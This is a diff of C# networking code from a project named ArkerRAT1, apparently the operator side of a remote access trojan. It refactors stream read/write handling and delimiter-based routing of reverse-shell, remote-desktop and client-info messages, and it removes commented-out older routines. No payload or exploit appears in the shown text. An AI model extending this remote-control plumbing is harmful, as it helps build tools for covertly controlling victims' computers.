@@ -48,39 +48,15 @@ namespace ArkerRAT1
 
         public async Task SendData(string textData)
         {
-            try
-            {
-                byte[] data = Encoding.UTF8.GetBytes(textData);
-                await clientStream.WriteAsync(data, 0, data.Length);
-                await clientStream.FlushAsync();
-            }
+                try
+                {
+                    byte[] data = Encoding.UTF8.GetBytes(textData);
+                    await clientStream.WriteAsync(data, 0, data.Length);
+                    await clientStream.FlushAsync();
+                }
             catch(Exception ex) { }
         }
         
-        //string dataString = "";
-        //public async Task ReadData()
-        //{
-        //    try
-        //    {
-        //        while (!token.IsCancellationRequested)
-        //        {
-
-        //            byte[] data = new byte[131072];
-        //            await clientStream.ReadAsync(data, 0, data.Length);
-        //            lock (_lock)
-        //            {
-        //                dataString += Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0');
-        //            }
-        //            await clientStream.FlushAsync();
-
-        //            SortData("§ClientInfoStart§", "§ClientInfoEnd§");
-        //            SortData("§PingStart§", "§PingEnd§");
-        //            SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§");
-        //            SortData("§ReverseShellStart§", "§ReverseShellEnd");
-        //        }
-        //    }
-        //    catch (Exception ex) { }
-        //}
 
         public string data = string.Empty;
         private async void ReadData()
@@ -100,6 +76,8 @@ namespace ArkerRAT1
                         {
                             string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                             stringBuilder.Append(receivedData);
+
+                            
 
                             lock (GlobalVariables._lock)
                             {
@@ -151,7 +129,7 @@ namespace ArkerRAT1
                         else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
                         {
                             //Assing data to remotedesktop class.
-                            remoteDesktopWindow.ReceiveFrameChunk(subString);
+                            remoteDesktopWindow.frameQue.Enqueue(subString);                       
                         }
                         else if (startDelimiter == "§PingStart§")
                         {
@@ -173,38 +151,7 @@ namespace ArkerRAT1
                         }
 
 
-                        //if (startDelimiter == "§PlayerInfoStart§")
-                        //{
-
-                        //    string tempData = subString.Replace("§PlayerNameStart§", "").Replace("§PlayerNameEnd§", "");
-
-                        //    string[] info = { tempData, };
-
-                        //    name.Text = info[0];
-
-                        //    foreach (var player in GWarForm.game.players)
-                        //    {
-                        //        if (name.Text == player.name.Text)
-                        //        {
-                        //            Random random = new Random(DateTime.Now.Millisecond);
-                        //            name.Text += random.Next(1, 1000);
-                        //        }
-                        //    }
-
-                        //}
-                        //else if (startDelimiter == "§FunctionStart§")
-                        //{
-                        //    GWarForm.RaiseOnMathFuncData(subString, Point.Empty, "");
-                        //}
-                        //else if (startDelimiter == "§PingStart§")
-                        //{
-                        //    Thread.Sleep(2000);
-                        //    lock (lockPing)
-                        //    {
-                        //        ms.Restart();
-                        //    }
-                        //    WriteData("§PingStart§Ping§PingEnd§");
-                        //}
+                        
                     }
                     else
                     {
@@ -215,51 +162,6 @@ namespace ArkerRAT1
             } while (true);
         }
 
-        //private async void SortData(string startDelimiter, string endDelimiter)
-        //{
-        //    int startIndex = dataString.IndexOf(startDelimiter);
-
-        //    if (startIndex != -1)
-        //    {
-        //        int endIndex = dataString.IndexOf(endDelimiter, startIndex + startDelimiter.Length);
-
-        //        if (endIndex != -1 && endIndex > startIndex)
-        //        {
-        //            string subString = dataString.Substring(startIndex, endIndex - startIndex + endDelimiter.Length);
-        //            dataString = dataString.Remove(startIndex, subString.Length);
-
-        //            // Send dataString to the right function
-        //            if (startDelimiter == "§ReverseShellStart§")
-        //            {
-        //                await reverseShellWindow.ReversShellFunction(subString.Replace(startDelimiter, "").Replace(endDelimiter, ""));
-        //            }
-
-        //            if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
-        //            {
-        //                //Assing data to remotedesktop class.
-        //                remoteDesktopWindow.OnNewChunkReceived(subString);
-        //            }
-
-        //            if (startDelimiter == "§PingStart§")
-        //            {
-        //                whenToStartPinging = "§Ping§";
-        //            }
-
-        //            if (startDelimiter == "§ClientInfoStart§")
-        //            {
-        //                clientInfo = subString.Replace(startDelimiter, "").Replace(endDelimiter, "");
-        //            }
-        //        }
-        //        else
-        //        {
-        //            //SKIP
-        //        }
-        //    }
-        //    else
-        //    {
-        //        //SKIP
-        //    }
-        //}
 
 
         string whenToStartPinging = "";
